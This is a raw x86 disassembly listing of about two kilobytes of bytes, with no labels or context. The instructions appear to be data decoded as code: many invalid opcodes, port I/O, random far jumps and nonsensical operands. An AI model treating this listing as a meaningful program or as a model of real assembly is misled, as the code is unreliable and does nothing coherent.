  4102ca:	mov    ds:0xe00ee89f,eax
  4102cf:	clc    
  4102d0:	mov    ds:0x964c81ef,eax
  4102d5:	cdq    
  4102d6:	jns    0x410339
  4102d8:	fidiv  DWORD PTR [edx-0x77]
  4102db:	jae    0x4102f6
  4102dd:	push   ecx
  4102de:	sub    BYTE PTR [edi],dh
  4102e0:	mov    ds:0xedad5c27,eax
  4102e5:	adc    BYTE PTR [esi],0xb9
  4102e8:	mov    dl,0x4b
  4102ea:	mov    ebx,0xddf51ce0
  4102ef:	aam    0x4e
  4102f1:	jle    0x4102fd
  4102f3:	lock add DWORD PTR [esi-0x121c49bf],0x7930916c
  4102fe:	lods   eax,DWORD PTR ds:[esi]
  4102ff:	or     BYTE PTR [edx+0x46012e5f],0xce
  410306:	jnp    0x41034e
  410308:	mov    bh,0x69
  41030a:	or     ah,bl
  41030c:	push   0x9580aad4
  410311:	mov    ah,0x89
  410313:	add    DWORD PTR [edx],esi
  410315:	les    eax,FWORD PTR ss:[edx+0x69]
  410319:	shl    BYTE PTR [ebx],cl
  41031b:	pop    es
  41031c:	xchg   bh,bh
  41031e:	mov    ch,0xdd
  410320:	mov    ecx,0x4511e5d
  410325:	sbb    BYTE PTR [edi-0x2ab76589],cl
  41032b:	dec    ebx
  41032c:	ins    DWORD PTR es:[edi],dx
  41032d:	and    eax,0xc1e4f096
  410332:	inc    esi
  410333:	aad    0x28
  410335:	in     al,0xeb
  410337:	stos   DWORD PTR es:[edi],eax
  410338:	loope  0x4103aa
  41033a:	sub    al,0xfb
  41033c:	or     ebp,esp
  41033e:	push   edi
  41033f:	fs je  0x4103bf
  410342:	or     DWORD PTR [edi+ecx*4+0x18a9d199],esp
  410349:	sub    eax,0x2bba42cb
  41034e:	inc    edx
  41034f:	xor    DWORD PTR [ecx-0x6d],eax
  410352:	jno    0x4103b6
  410354:	ss add ecx,ebp
  410357:	nop
  410358:	rcl    ch,0xe3
  41035b:	cmp    BYTE PTR [esi+0x5e1533cb],dl
  410361:	sahf   
  410362:	push   ss
  410363:	lods   al,BYTE PTR ds:[esi]
  410364:	das    
  410365:	mov    dh,0x27
  410367:	xor    eax,0x6d229555
  41036c:	push   0xfffffff1
  41036e:	pop    es
  41036f:	popf   
  410370:	addr16 mov edi,0x7035fe24
  410376:	sbb    eax,0xffedd6ac
  41037b:	cmp    DWORD PTR [edi],edx
  41037d:	xor    bh,BYTE PTR [ebp+eax*1-0x5e6bac37]
  410384:	dec    edi
  410385:	dec    esp
  410386:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410387:	sub    BYTE PTR [ebx],ch
  410389:	mov    edx,edi
  41038b:	sbb    eax,0x2f4eede7
  410390:	sbb    DWORD PTR [edi+edi*4-0x4b],esi
  410394:	dec    edi
  410395:	mov    cl,0x17
  410397:	pop    ecx
  410398:	hlt    
  410399:	cmp    BYTE PTR [edi],al
  41039b:	add    edx,DWORD PTR [esi]
  41039d:	inc    ecx
  41039e:	add    al,BYTE PTR [edx+0x38fc624e]
  4103a4:	mov    BYTE PTR [edi+0x41],bl
  4103a7:	loopne 0x410405
  4103a9:	sub    DWORD PTR [eax-0x48],ebp
  4103ac:	pop    edi
  4103ad:	xor    DWORD PTR [ecx],esp
  4103af:	cmp    al,0x9
  4103b1:	sub    ebp,0x3120215c
  4103b7:	cs pop ebx
  4103b9:	adc    bl,BYTE PTR [esi-0x7b8bcacd]
  4103bf:	in     al,0x64
  4103c1:	rcl    BYTE PTR [eax+0x4b],1
  4103c4:	cmp    dh,ah
  4103c6:	loop   0x4103da
  4103c8:	imul   ebp,ecx,0x6b
  4103cb:	sub    eax,0xaf57e9d1
  4103d0:	cmp    eax,0xc2cd2f68
  4103d5:	pop    ebp
  4103d6:	sbb    eax,0x34bbad2a
  4103db:	mov    dl,0xae
  4103de:	stos   DWORD PTR es:[edi],eax
  4103df:	out    0x22,eax
  4103e1:	pop    esi
  4103e2:	dec    ebp
  4103e3:	fcom   QWORD PTR [edx]
  4103e5:	inc    edi
  4103e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4103e7:	xor    ebx,esp
  4103e9:	cmp    dl,BYTE PTR [esi+0x24b2c4be]
  4103ef:	js     0x4103e8
  4103f1:	out    dx,al
  4103f2:	adc    esi,esi
  4103f4:	pusha  
  4103f5:	push   ecx
  4103f6:	aam    0xd2
  4103f8:	in     eax,0x58
  4103fa:	jbe    0xf4155a7d
  410400:	xchg   edi,eax
  410401:	mov    ch,0x5e
  410403:	in     al,0xd5
  410405:	sub    eax,0xcdf24d7c
  41040a:	(bad)  
  41040b:	in     al,dx
  41040c:	push   ebx
  41040d:	not    DWORD PTR [edi+0x29]
  410410:	pop    ds
  410411:	jge    0x4103b4
  410413:	jns    0x410403
  410415:	jp     0x4103c5
  410417:	add    al,0xeb
  410419:	push   esp
  41041a:	fmulp  st(2),st
  41041c:	pop    edx
  41041d:	fwait
  41041e:	jne    0x4103af
  410420:	arpl   cx,bp
  410422:	xor    eax,0x11ca88b
  410427:	js     0x41041b
  410429:	lahf   
  41042a:	push   ebx
  41042b:	add    eax,0x502c2659
  410430:	fld    st(0)
  410432:	push   esi
  410433:	inc    esp
  410434:	test   ecx,ebx
  410436:	pop    dx
  410438:	and    BYTE PTR [esi+0x2e5cb1b1],ah
  41043e:	pop    esp
  41043f:	call   0x9c5bcb71
  410444:	aam    0x6e
  410446:	inc    ebp
  410447:	bound  ebx,QWORD PTR [esi-0x76f936ed]
  41044d:	xor    DWORD PTR [ebp+0x4788f216],0xfffffff4
  410454:	jle    0x41049a
  410456:	jg     0x410442
  410458:	(bad)  
  410459:	retf   
  41045a:	outs   dx,BYTE PTR ds:[esi]
  41045b:	cwde   
  41045c:	sbb    ecx,DWORD PTR [esi]
  41045e:	bound  ecx,QWORD PTR [ebp+0x38912afa]
  410464:	cmp    eax,0x91b64a23
  410469:	imul   ebp,DWORD PTR [ecx-0x7cdc5c11],0xffffff9a
  410470:	lds    edi,FWORD PTR [ecx]
  410472:	jmp    0xfaa4:0x83719243
  410479:	pop    esp
  41047a:	inc    esi
  41047b:	sar    dh,1
  41047d:	mov    WORD PTR [ecx],fs
  41047f:	mov    cs,edi
  410481:	add    eax,0x58971d05
  410486:	mov    DWORD PTR [esi],esi
  410488:	inc    esp
  410489:	dec    ebx
  41048a:	fldcw  WORD PTR [esi+0x49]
  41048d:	mov    ds:0x14c6031,al
  410492:	push   ss
  410493:	stc    
  410494:	aas    
  410495:	jge    0x4104f0
  410497:	in     al,dx
  410498:	aaa    
  410499:	xchg   edi,eax
  41049a:	xchg   ebp,ebx
  41049c:	leave  
  41049d:	xchg   edx,eax
  41049e:	mov    ch,0xae
  4104a0:	in     al,0xf7
  4104a2:	fadd   DWORD PTR [edi+edx*1+0x41d532a5]
  4104a9:	xchg   edi,eax
  4104aa:	pop    edi
  4104ab:	inc    ebx
  4104ac:	mov    ch,0x19
  4104ae:	mov    al,ds:0x7c6df239
  4104b3:	cmp    ebx,DWORD PTR [ebp+eax*4-0x37]
  4104b7:	jge    0x410528
  4104b9:	or     ecx,DWORD PTR [esi]
  4104bb:	inc    edi
  4104bc:	fiadd  DWORD PTR [ebx]
  4104be:	jmp    0xe3dd:0x3c7339f7
  4104c5:	ret    
  4104c6:	fisttp WORD PTR [eax-0x19]
  4104c9:	test   dh,bh
  4104cb:	outs   dx,BYTE PTR ds:[esi]
  4104cc:	pop    es
  4104cd:	ss jns 0x41045f
  4104d0:	fs dec ebx
  4104d2:	push   eax
  4104d3:	retf   0x4d08
  4104d6:	imul   esi,ebx,0x2a06ed8b
  4104dc:	dec    edx
  4104dd:	add    cl,BYTE PTR [edx+eiz*4+0x55]
  4104e1:	outs   dx,BYTE PTR ds:[esi]
  4104e2:	dec    ecx
  4104e3:	adc    al,0x15
  4104e5:	jle    0x410555
  4104e7:	pop    ecx
  4104e8:	daa    
  4104e9:	arpl   WORD PTR [eax],bx
  4104eb:	sahf   
  4104ec:	lea    eax,[esi+0x28d9219e]
  4104f2:	out    0xf6,eax
  4104f4:	(bad)  
  4104f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4104f7:	int3   
  4104f8:	inc    eax
  4104f9:	inc    edi
  4104fa:	mov    bh,BYTE PTR [ebx-0x44843488]
  410500:	mov    ds:0xe96c2984,eax
  410505:	stos   BYTE PTR es:[edi],al
  410506:	mov    dl,0x52
  410508:	pop    edi
  410509:	or     dl,bh
  41050b:	daa    
  41050c:	dec    ebp
  41050d:	jno    0x4104bf
  41050f:	xchg   esp,ebx
  410511:	test   al,0xe7
  410513:	or     cl,cl
  410515:	or     ebx,eax
  410517:	pop    ecx
  410518:	ficom  WORD PTR ds:0x235dd17e
  41051e:	xor    eax,0x5b28d34f
  410523:	pop    ds
  410524:	mov    al,ds:0x6a3e760e
  410529:	add    dl,ch
  41052b:	scas   eax,DWORD PTR es:[edi]
  41052c:	(bad)  
  41052d:	scas   eax,DWORD PTR es:[edi]
  41052e:	mov    BYTE PTR [eax],cl
  410530:	js     0x41056c
  410532:	es js  0x410591
  410535:	repnz pop esp
  410537:	das    
  410538:	sbb    al,0x58
  41053a:	mov    DWORD PTR es:[ebp+0x61],edi
  41053e:	das    
  41053f:	sub    al,0x8d
  410541:	and    al,0xa2
  410543:	fisttp QWORD PTR [edi-0x59]
  410546:	cmp    ch,al
  410548:	in     al,dx
  410549:	adc    eax,0xa1588f96
  41054e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41054f:	mov    dl,0x82
  410551:	and    dl,bl
  410553:	pushw  0x4305
  410557:	or     ebx,DWORD PTR [edx+0x2fd38f5]
  41055d:	(bad)  
  41055e:	jmp    0x6a8c:0x587032e8
  410565:	cmc    
  410566:	lahf   
  410567:	repnz enter 0xe7ab,0xbb
  41056c:	call   0x81c3bce8
  410571:	sub    al,0x1d
  410573:	fcom   QWORD PTR [edx-0x3413ba85]
  410579:	sbb    edx,edx
  41057b:	inc    esi
  41057c:	aaa    
  41057d:	ret    
  41057e:	ja     0x410511
  410580:	in     al,dx
  410581:	(bad)  
  410582:	jno    0x410554
  410584:	dec    ebp
  410585:	neg    BYTE PTR [eax+0x6a]
  410588:	inc    edi
  410589:	ss inc ax
  41058c:	adc    al,0x2d
  41058e:	out    0x96,al
  410590:	fisubr WORD PTR [ebp+0x726958c6]
  410596:	sub    DWORD PTR [ebp-0x25],eax
  410599:	lods   eax,DWORD PTR ds:[esi]
  41059a:	mov    esi,0xe5bdf728
  41059f:	sub    al,0x6e
  4105a1:	nop
  4105a2:	dec    edx
  4105a3:	enter  0x14f4,0xe6
  4105a7:	inc    ebp
  4105a8:	mov    esi,0x118a2d6a
  4105ad:	loopne 0x410577
  4105af:	retf   0x679
  4105b2:	jne    0x410603
  4105b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4105b5:	aam    0x4d
  4105b7:	ins    BYTE PTR es:[edi],dx
  4105b8:	js     0x41058c
  4105ba:	fsub   QWORD PTR [eax+ecx*4+0x611baa4]
  4105c1:	sub    DWORD PTR [ebp+0xd],ebx
  4105c4:	rol    DWORD PTR [edx-0x78],0xda
  4105c8:	and    dh,BYTE PTR ds:0xa732b5a
  4105ce:	add    eax,DWORD PTR [eax-0x16cacaf]
  4105d4:	dec    edx
  4105d5:	shl    DWORD PTR [ecx],0xb1
  4105d8:	cli    
  4105d9:	fist   DWORD PTR [esi-0x59]
  4105dc:	cdq    
  4105dd:	test   BYTE PTR [edx],dh
  4105df:	fdiv   DWORD PTR [esi+0x44140118]
  4105e5:	in     eax,0x63
  4105e7:	mov    esi,0x830f39a5
  4105ec:	sar    DWORD PTR [ebp+0x4d],0x9b
  4105f0:	mov    edi,0x74e15858
  4105f5:	dec    edi
  4105f6:	addr16 mov ds:0x85c6,al
  4105fa:	cmp    edx,0xffffffe4
  4105fd:	xchg   edx,eax
  4105fe:	jp     0x4105e9
  410600:	sbb    ebp,ebp
  410602:	call   0xa5b5:0x9d93eff
  410609:	shl    BYTE PTR [ebx],0xb6
  41060c:	int    0x57
  41060e:	inc    edx
  41060f:	jl     0x410685
  410611:	outs   dx,DWORD PTR ds:[esi]
  410612:	mov    esp,0xc7b08c39
  410617:	call   DWORD PTR [eax]
  410619:	adc    ebp,esp
  41061b:	pop    ss
  41061c:	sahf   
  41061d:	and    eax,0xdf3ad5fb
  410622:	push   0xffffffed
  410624:	dec    BYTE PTR ds:0x18d9d81f
  41062a:	pushf  
  41062b:	pop    ebp
  41062c:	xchg   ebp,eax
  41062d:	sub    eax,0x6ef4489e
  410632:	fstp   QWORD PTR [eax]
  410634:	dec    ecx
  410635:	jns    0x41065f
  410637:	ds cwde 
  410639:	xchg   edx,eax
  41063a:	retf   
  41063b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41063c:	loop   0x4105fa
  41063e:	dec    ecx
  41063f:	pmulhuw mm4,QWORD PTR [ebp-0x7b]
  410643:	xchg   DWORD PTR [ebx-0x6d],ebp
  410646:	nop    DWORD PTR [ecx+0x9]
  41064a:	sbb    ebx,DWORD PTR [edi+0x3cfab7c]
  410650:	imul   esp,DWORD PTR [ecx-0x35],0x72646037
  410657:	daa    
  410658:	push   es
  410659:	cwde   
  41065a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41065b:	xor    BYTE PTR [eax-0x3d563125],dl
  410661:	inc    ebp
  410662:	sub    eax,0x523be7c
  410667:	les    ecx,FWORD PTR [esp+ebx*2]
  41066a:	push   ebp
  41066b:	push   esi
  41066c:	mov    dl,0x48
  41066e:	xor    ebx,DWORD PTR [esi-0x7962ae54]
  410674:	in     eax,0xa5
  410676:	loope  0x410673
  410678:	test   al,0xa3
  41067a:	dec    ecx
  41067b:	xchg   edi,eax
  41067c:	ret    
  41067d:	jge    0x4106f3
  41067f:	stos   DWORD PTR es:[edi],eax
  410680:	sbb    eax,DWORD PTR [ecx-0x29]
  410683:	add    eax,0x1e060251
  410688:	aad    0x17
  41068a:	xor    DWORD PTR [edi-0x6],ecx
  41068d:	sub    eax,0xd6e9ce5c
  410692:	pop    ebx
  410693:	loop   0x4106d5
  410695:	mov    eax,0x7a82593b
  41069a:	mov    dl,0x3d
  41069c:	ja     0x4106ae
  41069e:	jnp    0x4106e7
  4106a0:	mov    ds:0x95f92edf,al
  4106a5:	repz (bad) 
  4106a7:	mov    al,ds:0x9872e13b
  4106ac:	test   dh,bl
  4106ae:	jb     0x41068d
  4106b0:	scas   eax,DWORD PTR es:[edi]
  4106b1:	(bad)  
  4106b2:	and    eax,0x4018d0ff
  4106b7:	dec    eax
  4106b8:	dec    ecx
  4106b9:	neg    ebp
  4106bb:	push   ebp
  4106bc:	sub    DWORD PTR [eax-0x1095ae03],ebx
  4106c2:	jl     0x410667
  4106c4:	sti    
  4106c5:	or     eax,0x1d68c2a
  4106ca:	sub    BYTE PTR [esi],0x94
  4106cd:	jle    0x4106af
  4106cf:	xor    al,0x2e
  4106d2:	cmp    DWORD PTR [edx+0x3c],ebp
  4106d5:	in     al,dx
  4106d6:	and    eax,DWORD PTR [ebx]
  4106d8:	sbb    BYTE PTR [ebx+edi*8],0x14
  4106dc:	push   cs
  4106dd:	inc    esi
  4106de:	pop    ds
  4106df:	fild   QWORD PTR es:[ebx-0xf62b2e0]
  4106e6:	mov    eax,ds:0x43294de5
  4106eb:	xor    al,0x98
  4106ed:	psllw  mm7,mm2
  4106f0:	repz fnstcw WORD PTR [eax+0x37]
  4106f4:	cmc    
  4106f5:	bound  esp,QWORD PTR [edx+0x3ed6df23]
  4106fb:	xchg   ebp,eax
  4106fc:	xchg   ecx,eax
  4106fd:	xor    eax,0xef30f74c
  410702:	xor    DWORD PTR ds:0x2f39fc10,eax
  410708:	iret   
  410709:	aas    
  41070a:	js     0x4106fd
  41070c:	mov    ch,0x97
  41070e:	fidivr DWORD PTR [edi+0xe84dd8b]
  410714:	leave  
  410715:	lahf   
  410716:	push   ebp
  410717:	mov    eax,ds:0x1bf685ec
  41071c:	retf   0x1ced
  41071f:	stos   DWORD PTR es:[edi],eax
  410720:	add    bl,BYTE PTR [ebp-0x41]
  410723:	scas   al,BYTE PTR es:[edi]
  410724:	rcl    eax,cl
  410726:	or     eax,0x864e1893
  41072b:	add    ecx,DWORD PTR [ecx+0x5d]
  41072e:	test   BYTE PTR [edi],dl
  410730:	cs sub al,0x86
  410733:	cmp    al,0x68
  410735:	fsubp  st(1),st
  410737:	push   ds
  410738:	mov    ah,al
  41073a:	add    al,0xd6
  41073c:	mov    eax,0xb4e1156a
  410741:	ret    
  410742:	xchg   esi,eax
  410743:	sub    DWORD PTR [edx],esp
  410745:	pop    esp
  410746:	test   BYTE PTR [edi-0x4c45ace1],bl
  41074c:	pop    esi
  41074d:	pusha  
  41074e:	add    esp,DWORD PTR [edx+0x9]
  410751:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410752:	cmp    ecx,esp
  410754:	in     eax,0x6
  410756:	dec    ebp
  410757:	push   ecx
  410758:	test   eax,0xddafc49
  41075d:	fsubr  QWORD PTR [eax+ebp*1]
  410760:	shl    DWORD PTR [edi+ebp*8],cl
  410763:	mov    ebx,DWORD PTR ds:0x548a51d3
  410769:	test   BYTE PTR [ebx+0x677c0325],0xc5
  410770:	lahf   
  410771:	mov    ebp,0x47bedfa6
  410776:	(bad)  
  410777:	(bad)  
  410778:	cmc    
  410779:	lock xchg edi,eax
  41077b:	or     BYTE PTR [ebx+0x6cc8dce9],0x69
  410782:	push   ss
  410783:	push   eax
  410784:	call   0xaf42:0xe06f4b5d
  41078b:	mov    al,ds:0x57d797d8
  410790:	arpl   di,bp
  410792:	dec    esp
  410793:	xchg   BYTE PTR [ebx-0x1812d8b8],ah
  410799:	mov    dh,0x98
  41079b:	add    eax,0x3807e0a8
  4107a0:	scas   eax,DWORD PTR es:[edi]
  4107a1:	and    ah,BYTE PTR [eax]
  4107a3:	inc    edi
  4107a4:	in     eax,dx
  4107a5:	sub    DWORD PTR [edi],esp
  4107a7:	dec    esp
  4107a8:	jne    0x410804
  4107aa:	shl    esp,cl
  4107ac:	pop    esp
  4107ad:	call   0x1d44:0x54223334
  4107b4:	cmp    al,0xe5
  4107b6:	imul   esi,ecx,0x34
  4107b9:	(bad)  
  4107ba:	push   eax
  4107bb:	js     0x410823
  4107bd:	and    BYTE PTR [ecx-0x10982541],ch
  4107c3:	fld    QWORD PTR [ebp+ecx*8+0x7904a52d]
  4107ca:	pop    edi
  4107cb:	cs mov esp,0xf6f92824
  4107d1:	jo     0x410821
  4107d3:	dec    esp
  4107d4:	mov    ecx,0xe55c6ab
  4107d9:	xor    bl,BYTE PTR [edi-0x5a081646]
  4107df:	mov    dh,0x12
  4107e1:	inc    edi
  4107e2:	xchg   edx,eax
  4107e3:	xchg   DWORD PTR [edx],ecx
  4107e5:	lea    ebp,[edx+edx*4]
  4107e8:	xor    eax,0x9cb27db4
  4107ed:	stc    
  4107ee:	mov    esp,0xdc3185c8
  4107f3:	sahf   
  4107f4:	in     al,0xd4
  4107f6:	mov    dh,0xa2
  4107f8:	psubsw mm4,mm2
  4107fb:	out    0x51,eax
  4107fd:	call   0xebd8949d
  410802:	mov    bl,0x4c
  410804:	pop    es
  410805:	and    ecx,ecx
  410807:	imul   edi,edx,0x74718f5b
  41080d:	aas    
  41080e:	mov    cl,0x7f
  410810:	mov    ah,0xc8
  410812:	sub    edx,DWORD PTR [edx+0x32]
  410815:	ins    BYTE PTR es:[edi],dx
  410816:	rcl    BYTE PTR [ecx-0x632952db],cl
  41081c:	and    DWORD PTR [ebx+ebp*2+0x23],eax
  410820:	or     esp,edx
  410822:	pop    edi
  410823:	jmp    0x410824
  410825:	scas   al,BYTE PTR es:[edi]
  410826:	arpl   ax,bx
  410828:	cli    
  410829:	xor    ecx,edi
  41082b:	jp     0x4107c8
  41082d:	jmp    0xb87:0xc2f93bd0
  410834:	aas    
  410835:	add    WORD PTR [esi-0x50cbee5],bp
  41083c:	mov    al,ds:0x829d3400
  410841:	add    al,0x4d
  410843:	in     al,0x26
  410845:	mov    al,ds:0xeeafeea3
  41084a:	dec    ecx
  41084b:	mov    edx,0x19d7303
  410850:	push   esp
  410851:	frstor ds:0x51448caa
  410857:	or     DWORD PTR [ebx],edx
  410859:	pushf  
  41085a:	sub    BYTE PTR [esp+eax*8],bl
  41085d:	stos   DWORD PTR es:[edi],eax
  41085e:	out    0x8,eax
  410860:	mov    edx,DWORD PTR [ebx-0x72]
  410863:	adc    al,0x5b
  410865:	popa   
  410866:	retf   
  410867:	adc    BYTE PTR ds:0x8464014c,al
  41086d:	mov    eax,0xb5ac4b3b
  410872:	sbb    al,0xcd
  410874:	cmp    al,0xd6
  410876:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410877:	sar    DWORD PTR [eax-0x2f1e12],1
  41087d:	pop    esi
  41087e:	xchg   edx,eax
  41087f:	bound  esp,QWORD PTR [edi+0x41f571d2]
  410885:	pop    edx
  410886:	sbb    DWORD PTR [ecx],esi
  410888:	repnz sbb ch,BYTE PTR ds:0xc902f0b2
  41088f:	inc    eax
  410890:	cmc    
  410891:	les    edx,FWORD PTR [ebx+ecx*8]
  410894:	mov    ch,0x88
  410896:	cwde   
  410897:	push   esp
  410898:	dec    esi
  410899:	sbb    eax,0x2826c820
  41089e:	jg     0x410896
  4108a0:	scas   al,BYTE PTR es:[edi]
  4108a1:	adc    ecx,DWORD PTR ds:0xb8a8d110
  4108a7:	(bad)  [edi]
  4108a9:	iret   
  4108aa:	lock test eax,0xbd3bf5fe
  4108b0:	(bad)  
  4108b1:	sbb    ebp,DWORD PTR [esi+0x3f]
  4108b4:	nop
  4108b5:	adc    al,0x30
  4108b7:	push   ecx
  4108b8:	pop    edx
  4108b9:	les    eax,FWORD PTR [ebx]
  4108bb:	ficomp WORD PTR [edi]
  4108bd:	dec    esp
  4108be:	mov    ds:0x6c815076,eax
  4108c3:	push   ecx
  4108c4:	mov    edi,0xcb210582
  4108c9:	xor    BYTE PTR ds:0x21d975b,bh
  4108cf:	mov    eax,0xef1d4493
  4108d4:	add    edx,DWORD PTR [ebp+ecx*2-0x63508d91]
  4108db:	fimul  DWORD PTR [esi]
  4108dd:	cwde   
  4108de:	fwait
  4108df:	and    eax,0x4ac41aec
  4108e4:	sub    ecx,edx
  4108e6:	shl    DWORD PTR [ebp+eax*8+0x67],1
  4108ea:	popa   
  4108eb:	scas   eax,DWORD PTR es:[edi]
  4108ec:	push   edi
  4108ed:	lock adc eax,0x90d7f3bd
  4108f3:	pop    edi
  4108f4:	test   DWORD PTR [ebx],ecx
  4108f6:	cmp    al,0xdf
  4108f8:	xchg   edx,eax
  4108f9:	cdq    
  4108fa:	push   0xeda255e5
  4108ff:	ss retf 0x1969
  410903:	push   ecx
  410904:	adc    DWORD PTR [esp+eax*8+0x6c669ead],0xacac7b39
  41090f:	out    dx,al
  410910:	add    BYTE PTR [eax+0x2bd417c4],dl
  410916:	loopne 0x410997
  410918:	loop   0x4108b3
  41091a:	push   0x4c
  41091c:	in     al,dx
  41091d:	fwait
  41091e:	rol    DWORD PTR [ebx+ebx*8-0x4625ee07],1
  410925:	pop    esi
  410926:	fwait
  410927:	aam    0x9
  410929:	push   0x776764df
  41092e:	ss dec ebx
  410930:	push   es
  410931:	mov    edi,0xd1da79d4
  410936:	(bad)  
  410937:	stos   DWORD PTR es:[edi],eax
  410938:	mov    edi,0xa0ae4170
  41093d:	sbb    ebx,DWORD PTR [eax-0x6b]
  410940:	xchg   ecx,eax
  410941:	add    DWORD PTR [eax],0xfb89d073
  410947:	dec    BYTE PTR [edi+0x3bd79cff]
  41094d:	call   0x91848f00
  410952:	fidivr WORD PTR [edi]
  410954:	adc    ecx,DWORD PTR [eax]
  410956:	pushf  
  410957:	pop    ss
  410958:	dec    edx
  410959:	pop    edi
  41095a:	out    dx,eax
  41095b:	push   ss
  41095c:	stos   DWORD PTR es:[edi],eax
  41095d:	push   ss
  41095e:	xchg   edx,eax
  41095f:	xchg   ecx,eax
  410960:	into   
  410961:	mov    BYTE PTR [eax],0x62
  410964:	xor    ecx,DWORD PTR [ebx-0x778e00de]
  41096a:	dec    eax
  41096b:	arpl   WORD PTR [ebx+eiz*4+0x5ce50ad9],dx
  410972:	cli    
  410973:	xchg   ebx,eax
  410974:	add    al,0xc9
  410976:	(bad)  
  410977:	xor    bl,BYTE PTR [edi]
  410979:	or     DWORD PTR [ecx+edi*2+0x32],esp
  41097d:	ret    
  41097e:	push   eax
  41097f:	sub    edi,ebp
  410981:	lahf   
  410982:	dec    ebp
  410983:	and    BYTE PTR [eax+0x28f561cb],al
  410989:	and    BYTE PTR [edi],cl
  41098b:	or     al,0x57
  41098d:	xchg   DWORD PTR [ecx],esi
  41098f:	jl     0x4109d8
  410991:	stc    
  410992:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410993:	lea    esi,[ecx-0x57a4fef9]
  410999:	mov    bh,0xff
  41099b:	jns    0x410a0c
  41099d:	rcr    DWORD PTR [ebx-0x13e8d773],0x9b
  4109a4:	push   edx
  4109a5:	popa   
  4109a6:	mov    ch,0x23
  4109a8:	jmp    0xeb7a:0x54890ffa
  4109af:	push   edi
  4109b0:	xchg   ebx,eax
  4109b1:	js     0x4109e6
  4109b3:	xchg   ebx,eax
  4109b4:	pop    esi
  4109b5:	les    ebp,FWORD PTR [ecx-0x34]
  4109b8:	retf   
  4109b9:	lods   eax,DWORD PTR ds:[esi]
  4109ba:	xor    al,0xe6
  4109bc:	inc    eax
  4109bd:	outs   dx,DWORD PTR ds:[esi]
  4109be:	add    esi,ebx
  4109c0:	push   ebx
  4109c1:	cs lock pop edx
  4109c4:	add    cl,BYTE PTR [eax-0x1e]
  4109c7:	sahf   
  4109c8:	pusha  
  4109c9:	dec    ecx
  4109ca:	cmp    al,0xd9
  4109cc:	and    BYTE PTR [ecx+0x1a5a837b],bh
  4109d2:	push   edi
  4109d3:	out    0x4b,al
  4109d5:	add    BYTE PTR [esi-0x57],0x11
  4109d9:	xor    eax,0x2b46adbc
  4109de:	mov    eax,0xe81e17ff
  4109e3:	ins    BYTE PTR es:[edi],dx
  4109e4:	hlt    
  4109e5:	jbe    0x410974
  4109e7:	jo     0x410a27
  4109e9:	ins    DWORD PTR es:[edi],dx
  4109ea:	dec    ebp
  4109eb:	xchg   edi,eax
  4109ec:	mov    ds:0x45b22e97,eax
  4109f1:	inc    eax
  4109f2:	sub    DWORD PTR [edx+0x3a],ebx
  4109f5:	inc    esi
  4109f6:	xchg   DWORD PTR [edx],ebx
  4109f8:	loopne 0x410a16
  4109fa:	ret    0xcd5f
  4109fd:	in     al,0x2e
  4109ff:	inc    eax
  410a00:	pop    ebp
  410a01:	xor    BYTE PTR [eax+0x51],dh
  410a04:	pop    ebp
  410a05:	(bad)  
  410a06:	test   BYTE PTR [edi],0x47
  410a09:	push   esp
  410a0a:	push   esi
  410a0b:	push   cs
  410a0c:	mov    DWORD PTR [edi-0x78],edi
  410a0f:	in     al,0x3b
  410a11:	das    
  410a12:	outs   dx,DWORD PTR ds:[esi]
  410a13:	or     eax,0xc14ceee9
  410a18:	adc    BYTE PTR [ecx+edi*1+0x1c],cl
  410a1c:	sti    
  410a1d:	dec    ebp
  410a1e:	sbb    eax,0x100aef6d
  410a23:	das    
  410a24:	jo     0x410a58
  410a26:	mov    ecx,DWORD PTR [esp+esi*8+0x1f]
  410a2a:	shl    esi,cl
  410a2c:	adc    DWORD PTR [ecx-0x5f4abd51],ecx
  410a32:	jne    0x410ab2
  410a34:	std    
  410a35:	cmp    BYTE PTR [esi-0x681f879c],ah
  410a3b:	jl     0x4109db
  410a3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a3e:	fiadd  WORD PTR [edx+0x4f]
  410a41:	sar    BYTE PTR [ebp+ebp*8-0x56],0x51
  410a46:	fistp  DWORD PTR [eax+0xe]
  410a49:	jbe    0x410a1f
  410a4b:	cmp    dh,BYTE PTR [edi+0x34]
  410a4e:	ss dec ebp
  410a50:	jmp    DWORD PTR [esi-0x3f0b78c5]
  410a56:	scas   al,BYTE PTR es:[edi]
  410a57:	rcl    DWORD PTR [ebx-0x11],1
  410a5a:	mov    edi,DWORD PTR [edi+0x8]
  410a5d:	lds    ebp,FWORD PTR [eax+0x5cf40ce6]
  410a63:	push   ebp
  410a64:	mov    DWORD PTR [ecx+0x79c5b217],0x2fdfda30
  410a6e:	inc    eax
  410a6f:	dec    ebp
  410a70:	fwait
  410a71:	cli    
  410a72:	cmp    al,0x6
  410a74:	int    0xfb
  410a76:	in     al,dx
  410a77:	call   0xa79ec9ac
  410a7c:	inc    edx
  410a7d:	jae    0x410a1f
  410a7f:	jp     0x410a01
  410a81:	sbb    al,0x82
  410a83:	daa    
  410a84:	xor    BYTE PTR [eax-0x3c],0xb8
  410a88:	dec    ecx
  410a89:	mov    ecx,0x213eafae
  410a8e:	xor    al,0xdc
  410a90:	jg     0x410ae8
  410a92:	stc    
  410a93:	xchg   esi,eax
  410a94:	sub    ch,ah
  410a96:	add    DWORD PTR [edx-0x3ad1977c],edx
  410a9c:	ins    DWORD PTR es:[edi],dx
  410a9d:	mov    ds:0x25f8cda0,al
  410aa2:	cmp    ebp,DWORD PTR [ecx+0x3b]
  410aa5:	repz xchg ebp,eax
  410aa7:	push   0x37
  410aa9:	popa   
  410aaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410aab:	repnz or BYTE PTR [eax+0x5ab06995],ch
  410ab2:	dec    ebp
  410ab3:	repnz idiv DWORD PTR [ebx+ecx*1+0x6736ac47]
  410abb:	rcl    DWORD PTR [eax],0xd7
  410abe:	xor    DWORD PTR [esi-0x33],ecx
